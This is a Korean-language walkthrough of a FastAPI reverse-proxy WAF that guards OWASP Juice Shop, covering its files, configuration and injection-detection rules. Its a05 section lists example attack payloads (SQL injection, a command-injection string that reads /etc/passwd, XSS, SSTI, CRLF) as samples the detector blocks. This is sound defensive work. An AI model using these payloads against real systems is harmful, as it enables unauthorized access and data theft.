# AI Security System — 전체 코드 상세 분석서

> **작성 목적:** 프로젝트를 처음 접하는 팀원 또는 발표 심사 위원이 소스코드 한 줄 한 줄의 의미를 빠짐없이 이해할 수 있도록 모든 파일을 순서대로 정밀 해설합니다.  
> **언어:** 한국어 위주, 기술 용어(클래스명·함수명·패키지명·HTTP 용어 등)는 영어 병기  
> **최종 갱신:** 2026-03-26

---

## 목차

1. [프로젝트 개요 및 전체 구조](#1-프로젝트-개요-및-전체-구조)
2. [설정 파일](#2-설정-파일)
   - [requirements.txt](#21-requirementstxt)
   - [requirements-dev.txt](#22-requirements-devtxt)
   - [.env.example](#23-envexample)
   - [.gitignore](#24-gitignore)
   - [docker-compose.yml](#25-docker-composeyml)
3. [핵심 Python 파일](#3-핵심-python-파일)
   - [main.py](#31-mainpy)
   - [detector.py](#32-detectorpy)
   - [request_snapshot.py](#33-request_snapshotpy)
   - [traffic_log.py](#34-traffic_logpy)
4. [owasp/ 패키지](#4-owasp-패키지)
   - [owasp/types.py](#41-owasptypespy)
   - [owasp/__init__.py](#42-owasp__init__py)
   - [owasp/a01.py ~ a04.py, a06.py ~ a10.py](#43-owaspa01py--a04py-a06py--a10py-스켈레톤-모듈)
   - [owasp/a05.py](#44-owaspa05py--가장-핵심-파일)
5. [templates/](#5-templates)
   - [templates/dashboard.html](#51-templatesdashboardhtml)
6. [static/waf/](#6-staticwaf)
   - [static/waf/css/dashboard.css](#61-staticwafcssdashboardcss)
   - [static/waf/js/dashboard.js](#62-staticwafmjsdashboardjs)
7. [verification/](#7-verification)
   - [verification/conftest.py](#71-verificationconftestpy)
   - [verification/app_health.py](#72-verificationapp_healthpy)
   - [verification/waf_dashboard.py](#73-verificationwaf_dashboardpy)
   - [verification/detector_policy.py](#74-verificationdetector_policypy)
   - [verification/traffic_recorder.py](#75-verificationtraffic_recorderpy)
   - [verification/proxy_rewrite.py](#76-verificationproxy_rewritepy)
   - [verification/waf_block_page.py](#77-verificationwaf_block_pagepy)
   - [verification/a05_login_sqli.py](#78-verificationa05_login_sqlipy)
8. [전체 요청 처리 흐름 (End-to-End)](#8-전체-요청-처리-흐름-end-to-end)
9. [데이터 흐름 다이어그램](#9-데이터-흐름-다이어그램)

---

## 1. 프로젝트 개요 및 전체 구조

### 한 줄 요약
**FastAPI 기반 리버스 프록시(Reverse Proxy) WAF**로, 클라이언트와 OWASP Juice Shop 사이에 위치하여 모든 HTTP 요청을 인터셉트하고 OWASP Top 10:2025 기준으로 보안 위협을 탐지·차단한다.

### 아키텍처

```
[Browser / Client]
       │  HTTP 요청
       ▼
┌──────────────────────────────────┐
│   WAF Proxy  (main.py / FastAPI) │  ← 포트 8080
│  ┌────────────────────────────┐  │
│  │  WAF 대시보드 (/__waf/)    │  │
│  └────────────────────────────┘  │
│  ┌────────────────────────────┐  │
│  │  Detector (detector.py)    │  │
│  │  └─ OWASP 모듈 a01~a10    │  │
│  └────────────────────────────┘  │
└──────────┬───────────────────────┘
           │ 탐지 결과: 차단 → 403 HTML
           │ 탐지 결과: 통과 → 업스트림 전달
           ▼
┌──────────────────────────────────┐
│  OWASP Juice Shop (Docker)       │  ← 포트 3001
└──────────────────────────────────┘
```

### 전체 폴더·파일 구조

```
ai-security-system/
│
├── main.py                  ← FastAPI 앱 진입점, 리버스 프록시 + 모든 라우트
├── detector.py              ← OWASP 모듈 오케스트레이터 (스캔 실행·정책 판단)
├── request_snapshot.py      ← HTTP Request → RequestContext 변환기
├── traffic_log.py           ← 요청 이벤트 링 버퍼 (대시보드용 실시간 로그)
│
├── owasp/                   ← OWASP Top 10:2025 탐지 모듈 패키지
│   ├── __init__.py          ← OWASPModule 레지스트리 (10개 모듈 등록)
│   ├── types.py             ← 공용 데이터 클래스 (Severity, Finding, RequestContext 등)
│   ├── a01.py               ← A01 Broken Access Control (스켈레톤)
│   ├── a02.py               ← A02 Cryptographic Failures (스켈레톤)
│   ├── a03.py               ← A03 Injection (구버전, 스켈레톤)
│   ├── a04.py               ← A04 Insecure Design (스켈레톤)
│   ├── a05.py               ← A05 Injection ← 유일하게 완전 구현된 탐지 모듈
│   ├── a06.py               ← A06 Vulnerable Components (스켈레톤)
│   ├── a07.py               ← A07 Auth Failures (스켈레톤)
│   ├── a08.py               ← A08 Software Integrity Failures (스켈레톤)
│   ├── a09.py               ← A09 Security Logging Failures (스켈레톤)
│   └── a10.py               ← A10 SSRF (스켈레톤)
│
├── templates/
│   └── dashboard.html       ← Jinja2 HTML 템플릿 (대시보드 + A05 테스트 패널)
│
├── static/waf/
│   ├── css/dashboard.css    ← 대시보드 다크 테마 CSS (글래스모피즘)
│   └── js/dashboard.js      ← 대시보드 JavaScript (API 폴링, A05 테스트 UI)
│
├── verification/            ← 자동 검증 스위트 (pytest.ini → testpaths)
│   ├── conftest.py          ← 환경 변수 사전 설정
│   ├── app_health.py        ← 헬스 엔드포인트
│   ├── waf_dashboard.py     ← 대시보드·요약 API
│   ├── detector_policy.py   ← WAF 탐지 정책
│   ├── traffic_recorder.py  ← 트래픽 로그 기록·집계
│   ├── proxy_rewrite.py     ← URL 리라이트
│   ├── waf_block_page.py    ← 차단 HTML/JSON 분기
│   └── a05_login_sqli.py    ← A05 로그인 SQLi
│
├── docs/                    ← 팀 문서 (PLAN, ROADMAP, TESTING 등)
├── docker-compose.yml       ← Juice Shop 컨테이너 실행 설정
├── requirements.txt         ← 프로덕션 의존성
├── requirements-dev.txt     ← 개발·테스트 의존성
└── .env.example             ← 환경 변수 샘플
```

---

## 1-B. 파일별 역할 완전 정리 (쉬운 설명)

> 각 파일이 **왜 존재하는지**, **무슨 문제를 해결하는지**, **어떤 파일과 연결되는지** 를 최대한 쉽게 설명합니다.  
> 기술 용어가 낯설어도 이 섹션만 읽으면 전체 그림이 그려지도록 작성했습니다.

---

### 📦 루트 Python 파일 4개

---

#### `main.py` — 이 프로젝트의 "현관문"

```
비유: 건물 입구의 경비원 겸 안내원
```

**하는 일을 한 문장으로:**  
브라우저에서 오는 **모든 HTTP 요청을 가장 먼저 받아서**, 위험한 공격이면 막고, 안전하면 Juice Shop으로 전달하는 **중간 관리자** 역할.

**구체적으로 무슨 일을 하냐면:**

1. **받기** — 브라우저가 `http://내IP:8080/어떤경로` 로 요청을 보내면 main.py가 제일 먼저 받음
2. **검사 맡기기** — `detector.py`에게 "이 요청 수상하지 않아?" 하고 OWASP 검사를 맡김
3. **판단** — 검사 결과 위험하면 "🚫 차단!" 페이지를 브라우저에 돌려보냄
4. **전달** — 안전하면 Juice Shop(3001번 포트)으로 요청을 그대로 넘겨줌
5. **기록** — 차단했든 통과했든 결과를 `traffic_log.py`에 기록
6. **대시보드 서빙** — `/__waf/dashboard` 주소로 접속하면 관리자 대시보드 HTML을 줌
7. **정적 파일** — CSS, JS 같은 파일을 `/__waf/static/` 경로로 제공

**어떤 파일들을 사용하냐면:**
- `detector.py` → 스캔 실행
- `request_snapshot.py` → 요청을 분석 가능한 형태로 변환
- `traffic_log.py` → 로그 기록
- `owasp/a05.py` → 차단 HTML 페이지 생성
- `templates/dashboard.html` → 대시보드 화면 렌더링

---

#### `detector.py` — OWASP 검사 "총괄 지휘관"

```
비유: 검문소에서 10가지 항목을 체크리스트로 확인하는 검사관
```

**하는 일을 한 문장으로:**  
10개의 OWASP 탐지 모듈(`a01` ~ `a10`)을 차례로 실행시키고, 각 모듈이 찾아낸 위협 결과를 모아서 "이 요청 차단해야 해?" 라는 최종 판단을 내리는 **스캔 오케스트레이터**.

**구체적으로 무슨 일을 하냐면:**

1. `scan_request(ctx)` — 10개 모듈 각각 실행. `[a01, a02, ..., a10]`을 순서대로 돌림
2. `all_findings()` — 10개 결과에서 모든 "위협 발견!" 항목을 하나의 목록으로 합침
3. `findings_at_or_above_severity()` — "HIGH 이상만 추려줘" 같은 필터링
4. `parse_severity()` — 환경 변수 `"high"` 문자열을 내부 enum으로 변환

**왜 main.py 안에 합치지 않고 따로 있냐면:**  
→ "스캔 로직"과 "HTTP 처리 로직"을 분리해야 검증·수정이 쉬워지기 때문. `verification/detector_policy.py`에서 HTTP 서버 없이도 스캔 로직만 단독 검증 가능.

---

#### `request_snapshot.py` — "번역기"

```
비유: 외국어(HTTP 요청)를 우리말(분석 가능한 데이터 구조)로 통역해주는 번역가
```

**하는 일을 한 문장으로:**  
FastAPI/Starlette의 복잡한 `Request` 객체를 OWASP 탐지 모듈들이 쉽게 쓸 수 있는 단순한 `RequestContext` 데이터 구조로 변환.

**왜 필요한가:**  
각 OWASP 모듈(`a01.py`, `a05.py` 등)이 Starlette `Request` 객체를 직접 알 필요가 없어야 한다. 만약 FastAPI를 다른 프레임워크로 교체해도 이 파일 하나만 바꾸면 나머지 모듈은 그대로 유지됨.

**변환 과정:**
```
Starlette Request               →    RequestContext
─────────────────────────────────────────────────────
request.method                  →    method: "GET"
request.url.path                →    path: "/search"
request.url.query               →    query_string: "q=apple"
dict(request.headers.items())  →    headers: {"host": "...", ...}
(await request.body())[:8192]  →    body_preview: "username=admin&..."
```

---

#### `traffic_log.py` — "블랙박스 레코더"

```
비유: 항공기의 블랙박스. 모든 이벤트를 기록하되 꽉 차면 오래된 것부터 덮어씀
```

**하는 일을 한 문장으로:**  
프록시를 통과한 모든 요청(차단된 것 포함)을 메모리에 최대 200개 저장하고, 대시보드가 실시간으로 보여줄 수 있게 스냅샷을 제공.

**핵심 개념 쉬운 설명:**

| 개념 | 쉬운 설명 |
|---|---|
| 링 버퍼 (Ring Buffer) | 200개가 꽉 차면 가장 오래된 것을 지우고 새 것을 넣는 순환 저장소. 메모리가 무한정 늘어나지 않음 |
| 비동기 락 (asyncio.Lock) | 여러 요청이 동시에 로그를 쓰려 할 때 줄을 세워서 한 번에 하나씩만 쓰게 함. 데이터 꼬임 방지 |
| 접속자 집계 (_CLIENT_AGG) | 같은 IP에서 온 요청은 새 행을 만들지 않고 기존 카운터만 +1 함. IP별 방문 통계 |
| KST 시간대 | 로그 시각을 UTC가 아닌 한국 표준시(UTC+9)로 저장 |

**대시보드와의 관계:**  
대시보드 JavaScript가 2초마다 `/__waf/api/traffic` API를 호출 → `traffic_log.snapshot_dicts()` 실행 → 최신 200개 이벤트 반환.

---

### 🛡️ `owasp/` 패키지 파일들

---

#### `owasp/types.py` — "공통 언어 사전"

```
비유: 팀 전체가 쓰는 공통 용어 정의서. "Finding이 뭔지, Severity가 뭔지" 다 여기서 정의
```

**하는 일을 한 문장으로:**  
프로젝트 전체에서 사용하는 **4가지 핵심 데이터 타입**을 정의. 모든 Python 파일이 이 파일을 `import`해서 같은 데이터 구조를 사용.

**정의하는 4가지 타입:**

| 타입 | 역할 | 예시 |
|---|---|---|
| `Severity` | 위협 심각도 등급 | `NONE / LOW / MEDIUM / HIGH / CRITICAL` |
| `RequestContext` | 요청 정보 묶음 | `{method:"GET", path:"/search", query_string:"q=...", headers:{...}, body_preview:"..."}` |
| `Finding` | 탐지된 위협 하나 | `{rule_id:"A05-SQL-001", evidence:"SQL 인증 우회 탐지됨", severity:CRITICAL}` |
| `ModuleScanResult` | 모듈 하나의 스캔 결과 | `{module_id:"a05", owasp_id:"A05:2025", findings:(Finding1, Finding2, ...)}` |

**왜 별도 파일로 분리했나:**  
`main.py`, `detector.py`, `a01.py`, `a05.py` 등 여러 파일이 같은 데이터 구조를 써야 하는데, 각자 따로 정의하면 호환성 문제가 생김. 한 곳에서 정의하고 나머지는 `import`만 하면 됨.

---

#### `owasp/__init__.py` — "모듈 등록부"

```
비유: 경찰서의 담당자 배치표. "A05 사건은 이 형사(a05.scan)가 담당"
```

**하는 일을 한 문장으로:**  
10개 OWASP 모듈 각각의 정보(ID, 이름, 스캔 함수)를 `OWASPModule` 객체로 묶어 `MODULES` 튜플에 등록. `detector.py`가 이 튜플을 순회하며 스캔을 실행.

**`OWASPModule` 구조:**
```python
OWASPModule(
    module_id = "a05",              # 내부 식별자
    owasp_id  = "A05:2025",         # OWASP 공식 ID
    title     = "Injection",        # 표시 이름
    scan      = a05.scan            # 실제 실행될 함수
)
```

**새 모듈을 추가하려면:**  
`owasp/a11.py` 파일을 만들고 `__init__.py`에 한 줄만 추가하면 자동으로 스캔 파이프라인에 포함됨.

---

#### `owasp/a01.py` ~ `owasp/a10.py` (a05 제외) — "아직 공사중인 탐지소"

```
비유: 건물을 지었는데 아직 입주(구현)를 못 한 빈 사무실
```

**하는 일을 한 문장으로:**  
OWASP Top 10의 각 항목별 탐지 모듈 자리를 만들어 두었으나, 아직 실제 탐지 규칙이 구현되지 않아 항상 "위협 없음"을 반환하는 스켈레톤(뼈대) 코드.

**왜 빈 껍데기라도 만들어야 하나:**
- `detector.py`가 10개 모듈을 모두 반복 실행하는 구조라, 없는 모듈이 있으면 오류 발생
- 빈 껍데기가 있으면 나중에 해당 파일에 탐지 로직만 채워 넣으면 되므로 확장이 쉬움
- 각 모듈이 동일한 `scan(ctx)` → `ModuleScanResult` 인터페이스를 따름

**각 모듈이 다루는 OWASP 항목:**

| 파일 | OWASP ID | 공격 유형 | 설명 |
|---|---|---|---|
| `a01.py` | A01:2025 | Broken Access Control | 권한 없는 사용자가 관리자 페이지 접근 등 |
| `a02.py` | A02:2025 | Cryptographic Failures | 비밀번호를 암호화 없이 평문 저장 등 |
| `a03.py` | A03:2025 | Injection (구버전) | 이전 분류의 인젝션 |
| `a04.py` | A04:2025 | Insecure Design | 설계 자체의 보안 결함 |
| `a06.py` | A06:2025 | Vulnerable Components | 취약점이 있는 라이브러리 사용 |
| `a07.py` | A07:2025 | Auth Failures | 로그인 우회, 세션 탈취 등 |
| `a08.py` | A08:2025 | Software Integrity Failures | CI/CD 파이프라인 공격 등 |
| `a09.py` | A09:2025 | Logging Failures | 공격을 감지·기록하지 못하는 문제 |
| `a10.py` | A10:2025 | SSRF | 서버가 공격자가 원하는 내부 주소에 요청을 보내는 공격 |

---

#### `owasp/a05.py` — 이 프로젝트의 "핵심 탐지 엔진"

```
비유: 공항 보안 검색대의 X-ray 기계 + 금속 탐지기 + 폭발물 탐지기를 모두 합친 장비
```

**하는 일을 한 문장으로:**  
HTTP 요청의 모든 부분(URL, 쿼리스트링, 요청 바디, 헤더)을 **37개 규칙**으로 스캔해서 인젝션 공격을 탐지하고, 공격이 감지되면 브라우저에 보여줄 **HTML 차단 페이지**를 만들어냄.

**탐지하는 7가지 공격 유형:**

| 유형 | 공격 설명 | 예시 페이로드 | 규칙 수 |
|---|---|---|---|
| SQL Injection | DB 쿼리를 조작해 데이터 탈취 | `' OR 1=1--` | 9개 |
| OS Command Injection | 서버 운영체제 명령어 실행 | `; cat /etc/passwd` | 6개 |
| XSS | 악성 스크립트를 다른 사용자에게 실행 | `<script>alert(1)</script>` | 9개 |
| LDAP Injection | 디렉토리 서비스 쿼리 조작 | `*)(&` | 3개 |
| XPath Injection | XML DB 쿼리 조작 | `' or '1'='1` | 3개 |
| SSTI / EL Injection | 서버 템플릿 엔진에 코드 삽입 | `{{7*7}}` | 5개 |
| CRLF Injection | HTTP 헤더에 줄바꿈 삽입 | `%0d%0aSet-Cookie:evil=1` | 2개 |

**인코딩 우회 대응:**  
공격자가 `%27 OR 1=1` 처럼 URL 인코딩으로 필터를 피하려 해도, 이 모듈은 **원본 + 1회 디코딩 + 2회 디코딩** 값을 모두 검사하므로 우회 불가.

**검사하는 요청 위치:**
```
요청 경로       /search?q=' OR 1=1           ← 검사
쿼리스트링      q=' OR 1=1                   ← 개별 파라미터까지 검사
요청 바디       {"username":"' OR 1=1--"}    ← JSON 필드별 검사
헤더            User-Agent: <script>         ← 주요 헤더 검사
```

**탐지 시 동작:**
```
탐지 → Finding 생성 → make_block_html() 호출 → 브라우저에 403 HTML 페이지 반환
```

---

### 🖥️ 프론트엔드 파일들

---

#### `templates/dashboard.html` — "대시보드 화면 설계도"

```
비유: 인테리어 도면. 어디에 무엇을 배치할지 구조만 정의하고, 실제 내용(데이터)은 JS가 채움
```

**하는 일을 한 문장으로:**  
WAF 대시보드의 **HTML 뼈대**. Jinja2 템플릿 문법으로 서버에서 초기 데이터(업스트림 URL, WAF 설정 등)를 HTML 안에 주입하고, 이후 데이터 업데이트는 `dashboard.js`가 담당.

**화면 구성 요소:**
```
┌─────────────────────────────────────────────┐
│ 사이드바           │  상단바 (페이지명 + 시계) │
│ [🛡 WAF]          ├─────────────────────────┤
│ [↻ 갱신]          │  [업스트림]  [연결]       │
│                   │  [WAF]      [차단심각도]  │
│ 이동              ├─────────────────────────┤
│ [대시보드]         │  접속자 (IP별 카운트)     │
│ [프록시 /]         ├─────────────────────────┤
│                   │  🔍 A05 테스트 패널       │
│                   │  (method/path/query 입력) │
│                   │  [SQL] [XSS] [CMD] 프리셋 │
│                   ├─────────────────────────┤
│                   │  프록시 로그 (실시간 피드) │
└─────────────────────────────────────────────┘
```

**Jinja2 문법 사용 부분:**
- `{{ upstream }}` → `http://127.0.0.1:3001` 삽입
- `{{ boot | tojson }}` → Python 딕셔너리를 JSON 문자열로 변환해 HTML에 삽입

---

#### `static/waf/css/dashboard.css` — "대시보드 외관 스타일"

```
비유: 건물의 인테리어/외장 마감재
```

**하는 일을 한 문장으로:**  
대시보드의 **모든 시각적 스타일** 정의. 다크 테마, 글래스모피즘(유리 효과), 색상, 레이아웃, 애니메이션, 반응형 등을 담당.

**주요 디자인 요소:**

| 요소 | 설명 |
|---|---|
| 다크 테마 | 배경 `#060912` (거의 검정), 텍스트 `#f0f4fc` (밝은 흰색) |
| 글래스모피즘 | `backdrop-filter: blur(18px)` — 카드 뒤 배경이 흐리게 보이는 유리 효과 |
| 그라디언트 배경 | 파란빛·보라빛 타원형 광원 4개를 겹쳐서 깊이감 있는 배경 |
| 심각도 색상 | CRITICAL=빨강, HIGH=주황, MEDIUM=노랑, LOW=초록 |
| 반응형 | 768px 이하 화면에서 사이드바가 상단으로 이동 |

---

#### `static/waf/js/dashboard.js` — "대시보드 두뇌"

```
비유: 건물 자동화 시스템. 실시간으로 센서(API)를 읽어 화면 표시판을 업데이트
```

**하는 일을 한 문장으로:**  
브라우저에서 실행되는 JavaScript. 서버 API를 주기적으로 호출하여 트래픽 로그·접속자 현황을 **자동으로 화면에 갱신**하고, A05 탐지 테스트 UI의 입력→전송→결과 표시를 처리.

**주요 기능별 설명:**

| 함수 | 역할 | 호출 주기 |
|---|---|---|
| `setClock()` | 우측 상단 시계 업데이트 | 1초마다 |
| `loadSummary()` | WAF 설정·업스트림 상태 갱신 | 15초마다 |
| `loadTraffic()` | 프록시 로그 테이블 갱신 | 2초마다 |
| `loadClients()` | 접속자 테이블 갱신 | 2초마다 |
| `runA05Scan()` | A05 탐지 API 호출 후 결과 표시 | 버튼 클릭 시 |
| `renderA05Result()` | Finding 목록을 심각도별 카드로 렌더링 | `runA05Scan` 완료 후 |
| `escapeHtml()` | 서버 데이터를 HTML에 안전하게 출력 | 텍스트 삽입 시마다 |

**왜 `escapeHtml()`이 중요한가:**  
서버에서 받은 공격자의 페이로드(`<script>evil()</script>`)를 그냥 `innerHTML`에 넣으면 대시보드 자체가 XSS에 뚫림! 이 함수로 특수문자를 이스케이프해서 안전하게 표시.

---

### 🧪 `verification/` 파일들

---

#### `verification/conftest.py` — "실행 전 환경 고정"

```
비유: 시험 시작 전 OMR 카드를 나눠주고 이름 쓰는 준비 시간
```

**하는 일을 한 문장으로:**  
pytest가 테스트를 실행하기 **가장 먼저** 이 파일을 실행하여 필요한 환경 변수(`UPSTREAM_URL`, `WAF_ENABLED` 등)를 세팅. 이 설정이 없으면 `main.py`가 임포트될 때 환경 변수 누락으로 오류 발생.

---

#### `verification/app_health.py` — "기본 작동 확인"

```
비유: 전원 켜고 파워 LED 불 들어오는지 확인
```

**확인하는 것:** `/__proxy/health` 엔드포인트가 200을 반환하고 `status: "ok"` 필드를 포함하는지.

---

#### `verification/waf_dashboard.py` — "대시보드·API"

```
비유: 자동차 계기판 모든 램프가 제대로 켜지는지 점검
```

**확인하는 것들:**
- 대시보드 페이지 200 응답 + 한국어 텍스트 포함 여부
- CSS/JS 정적 파일 200 응답
- 알 수 없는 `/__waf/*` 경로 → JSON 404 반환
- 레거시 `/dashboard` → `/__waf/dashboard` 307 리다이렉트
- 요약 API JSON 구조 검증

---

#### `verification/detector_policy.py` — "차단 정책 로직"

```
비유: 저울이 정확히 측정하는지 무게추로 검증
```

**확인하는 것들:**
- `parse_severity("medium")` → `Severity.MEDIUM` 올바른 변환
- 잘못된 문자열 → 기본값 `HIGH` 폴백
- HIGH 이상 필터 → `[Finding(HIGH), Finding(CRITICAL)]` 반환
- CRITICAL 이상 필터 → `[Finding(CRITICAL)]` 반환

---

#### `verification/traffic_recorder.py` — "로그 기록"

```
비유: 보안 카메라 녹화 기능 정상 작동 여부 확인
```

**확인하는 것들:**
- 요청 기록 후 최신순으로 조회되는지
- WAF 내부 경로(`/__waf/`)는 로그에서 제외되는지
- 같은 IP의 두 번째 요청은 새 행이 아닌 카운터 +1이 되는지

---

#### `verification/proxy_rewrite.py` — "URL 치환 정확성"

```
비유: 번역 결과물이 맞는지 역번역으로 검증
```

**확인하는 것들:**
- `Location: http://127.0.0.1:3001/...` → `http://192.168.0.39:8080/...` 치환
- HTML 본문 내 `127.0.0.1:3001` → `192.168.0.39:8080` 치환 + 원본 주소 잔존 여부
- 리스트 형태 httpx 헤더 → Starlette Response로 변환 시 500 오류 없는지

---

### 📋 설정 파일들

---

#### `requirements.txt` — "이 프로젝트가 필요로 하는 외부 도구 목록"

```
비유: 요리 재료 목록 (레시피 재현을 위해 반드시 필요한 재료들)
```

| 패키지 | 쉬운 설명 |
|---|---|
| `fastapi` | 웹 서버 프레임워크. URL 라우팅·요청 파싱·응답 반환을 쉽게 해줌 |
| `uvicorn` | FastAPI를 실제로 실행시켜주는 ASGI 서버 (Node.js의 express 서버 같은 역할) |
| `httpx` | 업스트림 서버(Juice Shop)로 요청을 보낼 때 쓰는 HTTP 클라이언트 라이브러리 |
| `jinja2` | HTML 템플릿에 `{{ 변수 }}` 같은 문법으로 데이터를 넣어주는 템플릿 엔진 |

---

#### `.env.example` — "환경 설정 샘플"

```
비유: 새집 이사 후 인터넷 설치 신청서 양식
```

실제 `.env` 파일을 만들기 위한 **예시 템플릿**. Git에 올리지 않는 실제 `.env`와 달리, 이 파일은 "어떤 설정이 필요한지"를 팀원에게 알려주는 용도.

| 설정값 | 쉬운 설명 |
|---|---|
| `UPSTREAM_URL` | WAF가 요청을 넘겨줄 대상 서버 주소 |
| `WAF_BLOCK_MIN_SEVERITY` | 이 수준 이상이면 차단 (high 이상이면 HIGH, CRITICAL 탐지 시 차단) |
| `WAF_ENABLED` | WAF 기능 ON/OFF 스위치. false면 그냥 프록시만 동작 |

---

#### `docker-compose.yml` — "Juice Shop 실행 명령서"

```
비유: 조립 설명서. 이 파일대로 하면 테스트용 취약 웹서버가 자동으로 세팅됨
```

한 줄 명령 `docker compose up -d`로 OWASP Juice Shop(WAF 테스트 대상 서버)을 3001번 포트에 자동 실행. WAF 프록시와 Juice Shop이 같은 머신에서 동작할 수 있게 연결.

---

### 🔗 파일 간 의존 관계 전체 지도

```
                    ┌─────────────────┐
                    │   main.py       │ ← HTTP 요청의 시작점
                    └────────┬────────┘
                             │ 호출
               ┌─────────────┼──────────────┐
               ▼             ▼              ▼
    ┌──────────────┐  ┌──────────────┐  ┌───────────────┐
    │ request_     │  │ detector.py  │  │ traffic_log.py│
    │ snapshot.py  │  │              │  │               │
    │ (번역기)      │  │ (총괄 지휘관) │  │ (블랙박스)     │
    └──────┬───────┘  └──────┬───────┘  └───────────────┘
           │                 │ 10개 모듈 순차 실행
           ▼                 ▼
    ┌──────────────┐  ┌──────────────────────────────────┐
    │ owasp/       │  │ owasp/ 패키지                     │
    │ types.py     │  │                                   │
    │ (공통 언어)   │  │ __init__.py (등록부)              │
    └──────────────┘  │ ├─ a01.scan() → 빈 결과 반환      │
           ▲          │ ├─ a02.scan() → 빈 결과 반환      │
           │ 모두 import│ ├─ ...                           │
           └──────────┤ ├─ a05.scan() → Finding 탐지!    │
                      │ │   └─ make_block_html()           │
                      │ └─ a10.scan() → 빈 결과 반환      │
                      └──────────────────────────────────┘

    ┌──────────────────────────────────────────────────┐
    │ 프론트엔드                                        │
    │ templates/dashboard.html  (뼈대)                 │
    │ static/waf/css/dashboard.css  (외관)             │
    │ static/waf/js/dashboard.js   (두뇌, API 폴링)    │
    │   └─ 호출: /__waf/api/summary                    │
    │   └─ 호출: /__waf/api/traffic                    │
    │   └─ 호출: /__waf/api/clients                    │
    │   └─ 호출: /__waf/api/scan/a05  (테스트 패널)    │
    └──────────────────────────────────────────────────┘
```

---

## 2. 설정 파일

---

### 2.1 `requirements.txt`

```
fastapi>=0.110
uvicorn[standard]>=0.27
httpx>=0.27
jinja2>=3.1
```

**줄별 해설:**

| 패키지 | 역할 |
|---|---|
| `fastapi>=0.110` | 웹 프레임워크. 라우팅, 요청 파싱, 응답 직렬화를 담당. Starlette 위에 구축됨. |
| `uvicorn[standard]>=0.27` | ASGI 서버. FastAPI 앱을 실제 HTTP 서버로 띄우는 역할. `[standard]`는 `uvloop`(빠른 이벤트루프)과 `websockets` 포함. |
| `httpx>=0.27` | 업스트림 서버(Juice Shop)로 요청을 포워딩할 때 쓰는 async HTTP 클라이언트. `requests`의 async 버전. |
| `jinja2>=3.1` | HTML 템플릿 엔진. `templates/dashboard.html`을 렌더링할 때 사용. `{{ upstream }}` 같은 변수 치환 담당. |

---

### 2.2 `requirements-dev.txt`

개발·테스트 전용 의존성으로, 프로덕션 컨테이너에는 설치하지 않는다.  
`pytest`, `httpx`(TestClient용), `pytest-asyncio` 등이 포함되어 있다.

---

### 2.3 `.env.example`

```bash
UPSTREAM_URL=http://127.0.0.1:3001
WAF_BLOCK_MIN_SEVERITY=high
# WAF_ENABLED=true
# WAF_BODY_PREVIEW_MAX=8192
# PROXY_REWRITE_MAX_BYTES=6291456
```

**환경 변수 해설:**

| 변수 | 기본값 | 의미 |
|---|---|---|
| `UPSTREAM_URL` | `http://127.0.0.1:3001` | WAF가 요청을 전달할 업스트림 서버 주소. Juice Shop Docker 포트와 일치해야 함. |
| `WAF_BLOCK_MIN_SEVERITY` | `high` | 이 심각도 이상의 Finding이 있으면 요청을 차단(403 반환). `none\|low\|medium\|high\|critical` 중 선택. |
| `WAF_ENABLED` | `true` | `false`로 설정하면 WAF를 끄고 순수 프록시로만 동작. |
| `WAF_BODY_PREVIEW_MAX` | `8192` | 요청 바디에서 OWASP 모듈에 넘기는 최대 바이트 수. 너무 크면 성능 저하, 너무 작으면 탐지 누락. |
| `PROXY_REWRITE_MAX_BYTES` | `6291456` (6MiB) | 업스트림 응답 바디에서 절대 URL을 치환하는 최대 크기. 이미지·바이너리 같은 대용량은 건너뜀. |

실제 사용 시 `.env.example`을 `.env`로 복사 후 값을 수정한다:
```bash
cp .env.example .env
```

---

### 2.4 `.gitignore`

`.env`(시크릿), `__pycache__/`, `.DS_Store` 등 Git에 올리지 않을 파일 목록.  
**중요:** `.env`는 `.gitignore`에 반드시 포함되어야 한다. 실수로 올리면 API 키·비밀번호가 공개된다.

---

### 2.5 `docker-compose.yml`

```yaml
name: ai-security-system

services:
  juice-shop:
    image: bkimminich/juice-shop:latest
    ports:
      - "3001:3000"
    restart: unless-stopped
```

**줄별 해설:**

```yaml
name: ai-security-system
```
→ Docker Compose 프로젝트 이름. `docker compose ps` 등에서 이 이름으로 표시됨.

```yaml
services:
  juice-shop:
```
→ 서비스 이름을 `juice-shop`으로 정의. 이 이름으로 Docker 내부 DNS(`juice-shop:3000`)가 생성됨.

```yaml
    image: bkimminich/juice-shop:latest
```
→ Docker Hub의 공식 OWASP Juice Shop 이미지를 사용. `:latest`는 항상 최신 버전을 가져옴.  
→ Juice Shop은 실습용 취약한 웹 앱으로, WAF 테스트 타깃이 됨.

```yaml
    ports:
      - "3001:3000"
```
→ 형식: `"호스트포트:컨테이너포트"`.  
→ 컨테이너 내부 3000번을 호스트의 3001번으로 매핑. 오른쪽 3000은 이미지 고정값.  
→ `UPSTREAM_URL=http://127.0.0.1:3001`과 반드시 일치해야 함.

```yaml
    restart: unless-stopped
```
→ 컨테이너가 비정상 종료되면 자동 재시작. `docker stop`으로 수동 정지한 경우는 재시작 안 함.

**실행 명령:**
```bash
docker compose -f docker-compose.yml up -d
```
→ `-f`로 파일을 명시하는 이유: 같은 폴더에 다른 compose 파일이 있으면 병합되어 포트 충돌이 발생할 수 있기 때문.

---

## 3. 핵심 Python 파일

---

### 3.1 `main.py`

> **역할:** FastAPI 앱의 진입점. 리버스 프록시, WAF 대시보드, A05 테스트 API, 트래픽 로그 API 등 모든 HTTP 엔드포인트를 정의한다.

#### 전체 임포트 섹션 (1~28줄)

```python
from __future__ import annotations
```
→ Python 3.10 미만에서도 `X | Y` 타입 힌트(예: `Response | None`)를 사용할 수 있게 해주는 `__future__` 임포트.  
→ 실행 시점이 아닌 문자열로 어노테이션을 처리하므로 하위 호환성 유지.

```python
import os
from pathlib import Path
from typing import Any
from urllib.parse import urlparse
```
→ `os`: 환경 변수(`UPSTREAM_URL` 등) 읽기에 사용.  
→ `Path`: 파일시스템 경로를 OS 독립적으로 다루기 위해 사용. `Path(__file__).resolve().parent`로 현재 파일의 디렉토리를 얻음.  
→ `Any`: 타입 힌트에서 "어떤 타입이든 OK" 표현.  
→ `urlparse`: `UPSTREAM_URL`에서 scheme, host, port를 분리하기 위해 사용.

```python
import httpx
import jinja2
from fastapi import FastAPI, Request, Response
from starlette.datastructures import MutableHeaders
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
```
